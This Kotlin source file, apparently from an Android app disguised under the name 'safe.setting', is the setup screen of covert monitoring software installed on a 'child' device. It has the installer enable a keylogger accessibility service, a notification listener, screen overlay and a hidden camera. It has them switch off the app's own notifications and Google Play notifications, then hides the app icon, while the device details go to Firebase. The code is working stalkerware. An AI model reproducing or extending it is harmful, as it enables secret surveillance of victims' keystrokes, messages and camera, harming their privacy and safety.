package com.safe.setting.app.ui.activities.mainchild

import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.RelativeLayout
import android.widget.Toast
import androidx.appcompat.widget.SwitchCompat
import androidx.core.app.NotificationManagerCompat
import androidx.core.content.edit
import com.google.firebase.database.DatabaseReference
import com.safe.setting.app.R
import com.safe.setting.app.data.model.ChildPhoto
import com.safe.setting.app.data.preference.DataSharePreference.childSelected
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.databinding.ActivityMainChildBinding
import com.safe.setting.app.services.accessibilityData.AccessibilityDataService
import com.safe.setting.app.ui.activities.base.BaseActivity
import com.safe.setting.app.utils.ConstFun.isAddWhitelist
import com.safe.setting.app.utils.ConstFun.isAndroidM
import com.safe.setting.app.utils.ConstFun.isNotificationServiceRunning
import com.safe.setting.app.utils.ConstFun.openAccessibilitySettings
import com.safe.setting.app.utils.ConstFun.openNotificationListenerSettings
import com.safe.setting.app.utils.ConstFun.openWhitelistSettings
import com.safe.setting.app.utils.ConstFun.showApp
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.async.AsyncTaskRunCommand
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.safe.setting.app.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import com.safe.setting.app.utils.hiddenCameraServiceUtils.config.CameraFacing
// import com.pawegio.kandroid.show // **** पुराना इम्पोर्ट हटा दिया गया ****
import io.reactivex.rxjava3.disposables.Disposable
import javax.inject.Inject
import androidx.core.net.toUri
import com.safe.setting.app.services.devicestatus.DeviceStatusService

class MainChildActivity : BaseActivity<ActivityMainChildBinding>() {

    private lateinit var btnHideApp: Button
    private lateinit var btnEnableService: RelativeLayout
    private lateinit var btnEnableOverDraw: RelativeLayout
    private lateinit var btnEnableNotificationListener: RelativeLayout
    private lateinit var btnWhitelist: RelativeLayout
    private lateinit var btnAppNotificationSettings: RelativeLayout
    private lateinit var btnPlayStoreNotificationSettings: RelativeLayout

    private lateinit var switchOverDraw: SwitchCompat
    private lateinit var switchAccessibility: SwitchCompat
    private lateinit var switchNotificationListener: SwitchCompat
    private lateinit var switchWhitelist: SwitchCompat
    private lateinit var switchAppNotification: SwitchCompat
    private lateinit var switchPlayStoreNotification: SwitchCompat

    @Inject
    lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        initializeViews()
        getComponent()!!.inject(this)
        init()
        onClickApp()
        // डिवाइस स्टेटस सर्विस शुरू करें
        startService(Intent(this, DeviceStatusService::class.java))

    }

    private fun initializeViews() {
        btnHideApp = binding.btnHideApp
        btnEnableService = binding.btnEnableService
        btnEnableNotificationListener = binding.btnEnableServiceNotification
        btnWhitelist = binding.btnAddWhitelist
        btnEnableOverDraw = binding.btnEnableOverdraw
        btnAppNotificationSettings = binding.btnAppNotificationSettings
        btnPlayStoreNotificationSettings = binding.btnPlaystoreNotificationSettings
        switchNotificationListener = binding.switchNotification
        switchOverDraw = binding.switchOverdraw
        switchWhitelist = binding.switchAddWhitelist
        switchAccessibility = binding.switchAccessibility
        switchAppNotification = binding.switchAppNotification
        switchPlayStoreNotification = binding.switchPlaystoreNotification
    }

    override fun instanceViewBinding(): ActivityMainChildBinding {
        return ActivityMainChildBinding.inflate(layoutInflater)
    }

    override fun onResume() {
        super.onResume()
        checkSwitchPermissions()
        updateNotificationSwitches()
    }

    override fun addDisposable(disposable: Disposable) {}

    private fun init() {
        getReference("${Consts.DATA}/${Consts.CHILD_SHOW_APP}").setValue(true)
        getReference("${Consts.DATA}/${Consts.CHILD_NAME}").setValue(childSelected)

        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        val deviceName = if (model.startsWith(manufacturer, ignoreCase = true)) {
            model
        } else {
            "$manufacturer $model"
        }
        getReference("${Consts.DATA}/${Consts.DEVICE_NAME}").setValue(deviceName)

        val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
        getReference("${Consts.PHOTO}/${Consts.PARAMS}").setValue(childPhoto)
        getReference("${Consts.PHOTO}/${Consts.CHILD_PERMISSION}").setValue(true)
    }

    private fun checkSwitchPermissions() {
        switchOverDraw.isChecked = canOverDrawOtherApps()
        switchAccessibility.isChecked = AccessibilityDataService.isRunningService
        switchNotificationListener.isChecked = isNotificationServiceRunning()
        if (isAndroidM()) {
            // **** बदला हुआ कोड: kandroid.show को View.VISIBLE से बदलें ****
            switchWhitelist.isChecked = isAddWhitelist()
            btnWhitelist.visibility = View.VISIBLE
            // **** बदलाव समाप्त ****
        }
    }

    private fun updateNotificationSwitches() {
        switchAppNotification.isChecked = !NotificationManagerCompat.from(this).areNotificationsEnabled()
        switchPlayStoreNotification.isChecked = getPlayStoreVisitedPreference()
    }

    private fun onClickApp() {
        btnHideApp.setOnClickListener { checkPermissions() }
        btnEnableService.setOnClickListener {
            if (!AccessibilityDataService.isRunningService) {
                showDialog(
                    getString(R.string.title_dialog),
                    getString(R.string.msg_dialog_enable_keylogger),
                    getString(android.R.string.ok),
                    positiveAction = { openAccessibilitySettings() }
                )
            } else showMessage(R.string.already_activated)
        }
        btnEnableOverDraw.setOnClickListener {
            if (!canOverDrawOtherApps()) {
                showDialog(
                    getString(R.string.title_dialog),
                    getString(R.string.msg_dialog_enable_overdraw),
                    getString(android.R.string.ok),
                    positiveAction = { openDrawOverPermissionSetting() }
                )
            } else showMessage(R.string.already_activated)
        }

        btnEnableNotificationListener.setOnClickListener {
            if (!isNotificationServiceRunning()) {
                showDialog(
                    getString(R.string.title_dialog),
                    "Please enable the notification service for this app to view notifications.",
                    getString(android.R.string.ok),
                    positiveAction = { openNotificationListenerSettings() }
                )
            } else {
                showMessage(R.string.already_activated)
            }
        }

        btnWhitelist.setOnClickListener {
            if (!isAddWhitelist()) {
                openWhitelistSettings()
            } else showMessage(R.string.already_activated)
        }

        btnAppNotificationSettings.setOnClickListener {
            if (NotificationManagerCompat.from(this).areNotificationsEnabled()) {
                val dialogMessage = "You need to turn OFF notifications.\n\nAlso, if you see an 'Auto Start' or 'App launch' option in the same settings, please enable it.\n\nPress OK to continue."
                showDialog(
                    getString(R.string.title_dialog),
                    dialogMessage,
                    getString(android.R.string.ok),
                    positiveAction = { openNotificationSettings(packageName) }
                )
            } else {
                showMessage(R.string.already_activated)
            }
        }

        btnPlayStoreNotificationSettings.setOnClickListener {
            if (!getPlayStoreVisitedPreference()) {
                val dialogMessage = "You need to turn OFF notifications for Google Play products. Press OK to go to settings."
                showDialog(
                    getString(R.string.title_dialog),
                    dialogMessage,
                    getString(android.R.string.ok),
                    positiveAction = {
                        setPlayStoreVisitedPreference(true)
                        openNotificationSettings("com.android.vending")
                    }
                )
            } else {
                showMessage(R.string.already_activated)
            }
        }
    }

//    private fun openNotificationSettings(targetPackageName: String) {
//        try {
//            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
//                putExtra(Settings.EXTRA_APP_PACKAGE, targetPackageName)
//                flags = Intent.FLAG_ACTIVITY_NEW_TASK
//            }
//            startActivity(intent)
//        } catch (e: ActivityNotFoundException) {
//            Toast.makeText(this, "Could not open settings.", Toast.LENGTH_SHORT).show()
//        }
//    }
private fun openNotificationSettings(targetPackageName: String) {
    try {
        // *** FIX STARTS HERE ***
        // यह कोड केवल Android 8.0 (API 26) और उससे ऊपर के संस्करणों पर काम करेगा।
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                putExtra(Settings.EXTRA_APP_PACKAGE, targetPackageName)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            startActivity(intent)
        } else {
            // पुराने संस्करणों के लिए एक वैकल्पिक तरीका।
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = "package:$targetPackageName".toUri()
            startActivity(intent)
        }
        // *** FIX ENDS HERE ***
    } catch (e: ActivityNotFoundException) {
        Toast.makeText(this, "Could not open settings.", Toast.LENGTH_SHORT).show()
    }
}

    private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    private fun checkPermissions() {
        val appNotificationsOff = !NotificationManagerCompat.from(this).areNotificationsEnabled()
        val playStoreVisited = getPlayStoreVisitedPreference()

        if (canOverDrawOtherApps() && isNotificationServiceRunning() && AccessibilityDataService.isRunningService && isAddWhitelist() && appNotificationsOff && playStoreVisited) {
            showProgressDialog(null, getString(R.string.hiding))
            showApp(false)
            getReference("${Consts.DATA}/${Consts.CHILD_SHOW_APP}").setValue(false)
        } else {
            showDialog(
                getString(R.string.title_dialog),
                getString(R.string.enable_all_permissions),
                getString(android.R.string.ok)
            )
        }
    }

    private fun setPlayStoreVisitedPreference(visited: Boolean) {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        prefs.edit { putBoolean("play_store_visited", visited) }
    }

    private fun getPlayStoreVisitedPreference(): Boolean {
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        return prefs.getBoolean("play_store_visited", false)
    }

    private fun activatePermissionRoot(command: String, showDialog: Boolean, activate: () -> Unit) {
        AsyncTaskRunCommand({
            showProgressDialog(null, getString(R.string.activating))
        }, {
            hideDialog()
            if (it) {
                activate()
                if (showDialog) {
                    showDialog(
                        getString(R.string.title_dialog),
                        getString(R.string.activated_success),
                        getString(android.R.string.ok)
                    )
                }
            } else {
                showError(getString(R.string.failed_activate))
            }
        }).execute(command)
    }

    override fun onDestroy() {
        hideDialog()
        super.onDestroy()
    }
}
